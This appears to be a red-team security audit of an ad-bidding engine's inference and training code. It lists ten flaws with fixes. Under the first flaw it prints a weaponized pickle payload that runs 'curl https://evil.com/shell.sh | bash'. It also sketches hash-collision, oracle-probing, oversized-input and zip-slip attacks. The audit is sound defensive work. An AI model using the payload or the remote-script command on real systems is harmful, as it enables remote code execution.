# 🔴 FAANG-Level Security Audit — Nexus-RTB Engine

> **Classification**: Adversarial Red-Team Review  
> **Threat Model**: Malicious ad exchange, compromised model files, concurrent exploitation, input fuzzing  
> **Scope**: [Bid.py](file:///Users/soumyadebtripathy/Downloads/Adobe%20Devcraft%20PS/nexus-rtb-engine/src/Bid.py) (inference) + [train.py](file:///Users/soumyadebtripathy/Downloads/Adobe%20Devcraft%20PS/nexus-rtb-engine/training/train.py) (training pipeline)

---

## Vulnerability Summary Matrix

| #   | Vulnerability                           | Severity        | CVSS-like | Category               | File       | Lines        |
| --- | --------------------------------------- | --------------- | --------- | ---------------------- | ---------- | ------------ |
| 1   | Pickle Deserialization RCE              | **🔴 CRITICAL** | 9.8       | Remote Code Execution  | `Bid.py`   | 66–69        |
| 2   | Silent Exception Swallowing (Fail-Open) | **🔴 CRITICAL** | 8.5       | Logic Bypass           | `Bid.py`   | 78, 200, 208 |
| 3   | Adler32 Hash Collision → Model Evasion  | **🟠 HIGH**     | 7.5       | Adversarial ML         | `Bid.py`   | 84–86        |
| 4   | Budget Pacing Race Condition            | **🟠 HIGH**     | 7.2       | Concurrency            | `Bid.py`   | 122, 181     |
| 5   | Deterministic Oracle Attack             | **🟠 HIGH**     | 7.0       | Information Disclosure | `Bid.py`   | 120–206      |
| 6   | No Input Validation / Unbounded Strings | **🟡 MEDIUM**   | 6.5       | DoS / ReDoS            | `Bid.py`   | 133–138      |
| 7   | SQL Injection in Training Pipeline      | **🟡 MEDIUM**   | 6.0       | Injection              | `train.py` | 230–231      |
| 8   | Training Data Poisoning                 | **🟡 MEDIUM**   | 6.0       | Supply Chain           | `train.py` | 55–96        |
| 9   | Zip Bomb / Zip Slip in Training         | **🟡 MEDIUM**   | 5.5       | DoS / Path Traversal   | `train.py` | 60–83        |
| 10  | Float Precision Budget Drift            | **🟢 LOW**      | 4.0       | Logic Error            | `Bid.py`   | 181–183      |

---

## 🔴 VULN-1: Pickle Deserialization — Remote Code Execution

> [!CAUTION]
> **This is a CVE-class vulnerability. Pickle deserialization of untrusted data allows arbitrary code execution.**

### Location

```python
# Bid.py:66-69
model_path = os.path.join(os.path.dirname(__file__), "model_weights.pkl")
if os.path.exists(model_path):
    with open(model_path, "rb") as f:
        data = pickle.load(f)  # 💀 ARBITRARY CODE EXECUTION
```

### Attack Scenario

An attacker who can write or replace `model_weights.pkl` (via supply-chain compromise, CI/CD poisoning, or filesystem access) achieves **full RCE** when `Bid()` is instantiated.

### Exploit

```python
# attacker_payload.py — generates weaponized model_weights.pkl
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl https://evil.com/shell.sh | bash",))

with open("model_weights.pkl", "wb") as f:
    pickle.dump({"ctr": Exploit()}, f)
```

When the DSP framework loads `Bid()`, Python's `pickle.load()` calls `__reduce__()` → executes the attacker's shell command with the DSP server's privileges.

### Mitigation

**Code-level** — Replace `pickle` with a safe serialization format:

```python
import json, numpy as np

def safe_load_model(path):
    """Load model weights from a JSON + .npy format (no code execution)."""
    with open(path, 'r') as f:
        meta = json.load(f)
    weights_dir = os.path.dirname(path)
    meta['ctr']['coef'] = np.load(os.path.join(weights_dir, 'ctr_coef.npy'))
    meta['cvr']['coef'] = np.load(os.path.join(weights_dir, 'cvr_coef.npy'))
    return meta
```

**Architecture-level:**

- Sign `model_weights.pkl` with HMAC-SHA256; verify before loading
- Use `safetensors` or `numpy`-only serialization (no arbitrary object deserialization)
- Run model loading in a sandboxed subprocess with `seccomp` / `AppArmor`

---

## 🔴 VULN-2: Silent Exception Swallowing (Fail-Open Paths)

> [!CAUTION]
> Multiple `except Exception: pass` blocks silently swallow critical failures, creating **fail-open** behavior.

### Location 1 — Model Loading Failure ([Bid.py:78](file:///Users/soumyadebtripathy/Downloads/Adobe%20Devcraft%20PS/nexus-rtb-engine/src/Bid.py#L65-L79))

```python
try:
    # ... load model ...
except Exception:
    pass  # 💀 Model fails to load → falls back to hardcoded defaults
          # NO logging, NO alerting, NO health check failure
```

**Impact**: If `model_weights.pkl` is corrupted, truncated, or incompatible, the engine silently falls back to intercepts of `-4.0`, bidding blindly on ~1.8% estimated CTR for **every** request. Budget is burned on completely random impressions.

### Location 2 — Floor Price Parsing ([Bid.py:199-200](file:///Users/soumyadebtripathy/Downloads/Adobe%20Devcraft%20PS/nexus-rtb-engine/src/Bid.py#L196-L200))

```python
try: floor = int(floor_str)
except: pass  # 💀 Bare except — catches KeyboardInterrupt, SystemExit too
```

**Impact**: A malformed floor price like `"999.99"` or `"abc"` silently defaults to `floor = 0`, meaning **floor price compliance is bypassed**. The ad exchange sends a floor of 100, our engine ignores it and bids 50 — the bid should be rejected but isn't.

### Location 3 — Top-level `getBidPrice` ([Bid.py:208-209](file:///Users/soumyadebtripathy/Downloads/Adobe%20Devcraft%20PS/nexus-rtb-engine/src/Bid.py#L208-L209))

```python
except Exception:
    return -1  # Fail-CLOSED here (good), but...
```

**Hidden issue**: The exception handler on line 208 catches everything, including errors from corrupted model weights (e.g., `self.weights_ctr[h]` throwing `IndexError`). If the model is partially loaded (CTR loaded, CVR truncated), **every single request** hits this exception path and returns `-1`, completely disabling the bidder **without any alert**.

### Mitigation

```python
import logging
logger = logging.getLogger("nexus-rtb")

# Location 1: Fail LOUD on model load
try:
    data = pickle.load(f)
except Exception as e:
    logger.critical(f"MODEL LOAD FAILED: {e}", exc_info=True)
    raise RuntimeError(f"Cannot start bidder without valid model: {e}") from e

# Location 2: Strict floor parsing
try:
    floor = int(float(floor_str))  # Handle "99.99" → 99
except (ValueError, TypeError):
    logger.warning(f"Unparseable floor price: {floor_str!r}, using conservative default")
    floor = 300  # FAIL-CLOSED: refuse to bid if floor is unknown

# Location 3: Separate expected vs unexpected errors
except (ValueError, KeyError) as e:
    logger.debug(f"Expected skip: {e}")
    return -1
except Exception as e:
    logger.error(f"UNEXPECTED ERROR in getBidPrice: {e}", exc_info=True)
    # Increment error counter for circuit-breaker monitoring
    return -1
```

---

## 🟠 VULN-3: Adler32 Hash Collision → Model Evasion

### Analysis

```python
# Bid.py:84-86
def _hash(self, s: str) -> int:
    return (zlib.adler32(s.encode("utf-8")) & 0xffffffff) % self.HASH_SPACE
```

`adler32` is a **checksum**, not a cryptographic hash. It has known weaknesses:

- Only 32-bit output → Birthday attack finds collisions in ~65K attempts
- After `% 262144` (2^18), effective entropy is just **18 bits**
- Adversarial ad exchange can craft request fields that hash-collide with high-value features

### Attack Scenario

```python
# Attacker finds a domain string that collides with a high-CTR domain hash
import zlib
HASH_SPACE = 2**18
target_hash = zlib.adler32(b"domain:premium-site.com") % HASH_SPACE

# Brute-force collision (takes < 1 second)
for i in range(10_000_000):
    candidate = f"domain:evil-{i}.spam"
    if zlib.adler32(candidate.encode()) % HASH_SPACE == target_hash:
        print(f"COLLISION: {candidate}")  # This domain now gets premium bids
        break
```

**Impact**: The ad exchange sends requests with crafted domain values that hash-collide with premium domains. The engine bids high on garbage inventory, burning budget on worthless impressions.

### Mitigation

```python
import hashlib

def _hash(self, s: str) -> int:
    """Use a cryptographic hash to prevent adversarial collisions."""
    if not s:
        return 0
    digest = hashlib.sha256(s.encode("utf-8")).digest()
    # Use first 4 bytes for a 32-bit int, then modulo
    return int.from_bytes(digest[:4], 'big') % self.HASH_SPACE
```

> [!IMPORTANT]
> This change requires **retraining the model** since hash assignments change. Use `hashlib.sha256` in both `train.py` and `Bid.py`.

---

## 🟠 VULN-4: Budget Pacing Race Condition

### Analysis

```python
# Bid.py:122 — NOT ATOMIC
self.requests_seen += 1

# Bid.py:181 — NOT ATOMIC
self.estimated_spend += (raw_bid * self.ESTIMATED_WIN_RATE)
```

### Attack Scenario — Concurrent Request Flooding

If the DSP framework serves multiple requests concurrently (threads/async), these non-atomic read-modify-write operations create a **TOCTOU race condition**:

```
Thread A: reads estimated_spend = 1000
Thread B: reads estimated_spend = 1000  (stale!)
Thread A: writes estimated_spend = 1000 + 50 = 1050
Thread B: writes estimated_spend = 1000 + 80 = 1080  ← OVERWRITES Thread A's update
```

**Impact**:

- `requests_seen` is under-counted → pacing formula thinks we're earlier in the auction stream → **overspends aggressively**
- `estimated_spend` is under-counted → pacing never triggers cool-down → **budget exhaustion**
- Under adversarial concurrency (burst of 10K requests in 1ms), the engine can blow through 40–60% of the budget before the pacing loop corrects

### Mitigation

```python
import threading

class Bid(Bidder):
    def __init__(self):
        self._lock = threading.Lock()
        self._requests_seen = 0
        self._estimated_spend = 0.0
        # ...

    def getBidPrice(self, bidRequest):
        with self._lock:
            self._requests_seen += 1
            # ... all logic using self._requests_seen / self._estimated_spend ...
            self._estimated_spend += (raw_bid * self.ESTIMATED_WIN_RATE)
            return final_bid
```

**Architecture-level**: Use `asyncio` with a single-threaded event loop, or deploy behind a request-serializing queue to eliminate concurrency entirely.

---

## 🟠 VULN-5: Deterministic Oracle Attack

### Analysis

`getBidPrice()` is **entirely deterministic** — given the same `BidRequest` fields, it always returns the same bid price. There is no randomness, no nonce, no timestamp-based jitter.

### Attack Scenario

A competing DSP (or a corrupt ad exchange) can:

1. **Probe** with synthetic bid requests varying one feature at a time
2. **Reverse-engineer** the exact model weights by observing bid prices across systematic feature variations
3. **Reconstruct** the internal pCTR/pCVR predictions
4. **Exploit**: bid exactly `our_bid + 1` on high-value inventory to win every auction we'd have won, or bid `our_bid - 1` on low-value inventory to force us to overpay

```python
# Oracle probing attack
for city_code in range(0, 400):
    req = make_request(city=str(city_code), everything_else_fixed=True)
    bid = target_dsp.getBidPrice(req)
    print(f"city={city_code} → bid={bid}")
    # Differential analysis reveals per-city model weights
```

### Mitigation

```python
import random

# Add calibrated noise to prevent exact bid reconstruction
noise = random.uniform(0.92, 1.08)  # ±8% jitter
final_bid = int(raw_bid * pacing * noise)
```

**Architecture-level**: Implement **bid shading** — don't bid your true valuation. Use a randomized strategy mixed with Nash equilibrium analysis.

---

## 🟡 VULN-6: No Input Validation / DoS via Unbounded Strings

### Analysis

```python
# Bid.py:133-138 — No size limits on any field
ua = bidRequest.getUserAgent()       # Could be 10MB string
region = self._norm(bidRequest.getRegion())
city = self._norm(bidRequest.getCity())
domain = self._norm(bidRequest.getDomain())  # Could be 10MB string
```

### Attack Scenario

A malicious ad exchange sends a `BidRequest` with a 10MB `userAgent` string. Each call to `_hash()` then calls `.encode("utf-8")` on a 10MB string → `zlib.adler32()` on 10MB → multiple such calls per request → **latency spikes from <5ms to >500ms**, violating the latency SLA and causing bid timeouts.

```python
evil_request = BidRequest()
evil_request.setUserAgent("A" * 10_000_000)  # 10MB UA string
evil_request.setDomain("B" * 10_000_000)     # 10MB domain
# Engine spends all its time hashing, breaches 5ms SLA
```

### Mitigation

```python
MAX_FIELD_LEN = 512

def _safe_get(self, value, max_len=MAX_FIELD_LEN):
    """Truncate and sanitize input fields."""
    s = self._norm(value)
    return s[:max_len]

# Usage:
ua = self._safe_get(bidRequest.getUserAgent())
domain = self._safe_get(bidRequest.getDomain())
```

---

## 🟡 VULN-7: SQL Injection in Training Pipeline

### Analysis

```python
# train.py:230-231
cur.executemany(
    f"INSERT OR IGNORE INTO {table_name} (bidid) VALUES (?)",
    [(b,) for b in batch],
)
```

`table_name` is derived from a string literal (`"clicks"` / `"convs"`), so this specific call is safe. However, `fetch_existing` uses the same pattern:

```python
# train.py:250
cur.execute(
    f"SELECT bidid FROM {table_name} WHERE bidid IN ({placeholders})",
    batch,
)
```

While `table_name` is currently safe (hardcoded), the **`bidid` values come directly from the dataset without sanitization**. If a poisoned dataset contains bid IDs with embedded SQL, the parameterized query _should_ protect against injection. However:

**The real risk is different**: `bid_events.db` is written to `os.getcwd()` with `PRAGMA synchronous=OFF`:

```python
# train.py:139
cur.execute("PRAGMA synchronous=OFF")  # Corruption on crash
```

If the process crashes mid-write, the SQLite database is corrupted → labels are wrong → model is poisoned silently.

### Mitigation

- Remove `PRAGMA synchronous=OFF` in production
- Validate bidid format against a regex: `^[a-f0-9]{20,40}$`
- Add a checksum/integrity check before proceeding to model training

---

## 🟡 VULN-8: Training Data Poisoning via File Discovery

### Analysis

```python
# train.py:55-57
def discover_items(root: str):
    items = []
    for dirpath, _, filenames in os.walk(root):  # 💀 Walks ENTIRE directory tree from CWD
```

`os.walk(os.getcwd())` recursively scans **everything** under CWD, including any ZIP files.

### Attack Scenario

An attacker drops a poisoned file named `imp.99.txt` or `clk.99.txt` into any subdirectory of CWD. The training pipeline automatically discovers and ingests it, training on attacker-controlled data.

**Poisoning strategy**: Inject fake click events for low-quality domains → model learns high CTR for garbage inventory → engine overbids on worthless impressions.

### Mitigation

```python
# Explicit allowlist of data paths instead of recursive discovery
ALLOWED_DATA_DIR = os.path.join(os.path.dirname(__file__), "..", "dataset")

def discover_items(root: str):
    if not os.path.isdir(root):
        raise ValueError(f"Data directory does not exist: {root}")
    # Only scan the explicit directory, not subdirectories
    for fname in os.listdir(root):
        # ... validate ...
```

Add **data integrity verification**: hash each data file against a known manifest before ingestion.

---

## 🟡 VULN-9: Zip Bomb / Zip Slip in Training

### Analysis

```python
# train.py:62-63
with zipfile.ZipFile(fpath) as zf:
    for info in zf.infolist():
        # No check on info.file_size (zip bomb)
        # No check on info.filename for path traversal (zip slip)
```

### Attack Scenario

**Zip Bomb**: A 42KB zip that extracts to 4.5PB crashes the training server with OOM.

**Zip Slip**: A zip entry with `filename = "../../etc/cron.d/evil"` could write outside the intended directory if the pipeline ever extracts files (currently it streams, so **zip slip is not exploitable here**, but zip bomb via streaming decompression still is).

### Mitigation

```python
MAX_ENTRY_SIZE = 2 * 1024 * 1024 * 1024  # 2GB max per entry

for info in zf.infolist():
    if info.file_size > MAX_ENTRY_SIZE:
        print(f"SKIP oversized entry: {info.filename} ({info.file_size} bytes)")
        continue
    if '..' in info.filename or info.filename.startswith('/'):
        print(f"SKIP suspicious path: {info.filename}")
        continue
```

---

## 🟢 VULN-10: Float Precision Budget Drift

### Analysis

```python
# Bid.py:181
self.estimated_spend += (raw_bid * self.ESTIMATED_WIN_RATE)
```

Over 25M requests, float64 accumulation via `+=` introduces **precision drift**. With `raw_bid ≈ 80` and `win_rate = 0.2`:

- Each increment ≈ 16.0
- After 25M additions: `estimated_spend ≈ 400,000,000`
- Float64 has ~15 significant digits, so individual increments of 16.0 to a sum of 4×10^8 lose ~1–2 ULP of precision per operation

**Impact**: Negligible for this budget scale (~0.001% drift), but could compound in a longer-running system.

### Mitigation

Use Kahan compensated summation or `decimal.Decimal`:

```python
from decimal import Decimal
self.estimated_spend = Decimal('0')
# ...
self.estimated_spend += Decimal(str(raw_bid)) * Decimal('0.20')
```

---

## 🏗️ Architecture-Level Attack Scenarios

### Scenario A: Model Hot-Swap Attack

```mermaid
sequenceDiagram
    participant Attacker
    participant FileSystem
    participant DSP as Bid Engine

    Attacker->>FileSystem: Replace model_weights.pkl with weaponized version
    DSP->>FileSystem: Restart / Re-init
    FileSystem->>DSP: pickle.load() → RCE 💀
    DSP->>Attacker: Reverse shell established
```



**Mitigation**: Immutable container images, read-only filesystem mounts, model checksums verified at load.

### Scenario B: Budget Drain via Replay


**Mitigation**:

- Track `bidId` and reject duplicates
- Validate timestamps (reject requests > 30s old)
- Rate-limit per ad exchange source

### Scenario C: Pacing Manipulation

```mermaid
sequenceDiagram
    participant Exchange as Adversary Exchange
    participant DSP as Bid Engine

    Exchange->>DSP: Send 1M cheap requests (EV < gate)
    Note over DSP: requests_seen = 1,000,000<br/>estimated_spend = 0 (all rejected)
    Note over DSP: ideal_spend = 1M/25M × 25M = 1,000,000
    Note over DSP: Pacing: UNDERSPEND → factor = 1.15
    Exchange->>DSP: Now send 100 premium requests
    Note over DSP: Overbids at 1.15× on everything 💸
```



**Impact**: Attacker manipulates the pacing algorithm by front-loading rejected requests, then exploiting the resulting underspend acceleration.

---

## Summary of Required Fixes by Priority

### 🔴 Immediate (Block Deployment)

1. Replace `pickle.load()` with safe serialization + model signing
2. Remove all bare `except: pass` — fail loud or fail closed with logging
3. Add `threading.Lock` around all mutable state

### 🟠 Before Production

4. Replace `adler32` with `hashlib.sha256` (requires retrain)
5. Add bid request deduplication (track `bidId`)
6. Add ±5–8% randomized noise to bids
7. Input field length limits (512 char max)

### 🟡 Hardening

8. Restrict training data discovery to explicit paths
9. Add zip bomb size limits
10. Validate data file integrity with SHA256 manifest
11. Replace `PRAGMA synchronous=OFF` with WAL-only mode
12. Add structured logging + metrics (bid count, error rate, spend rate)
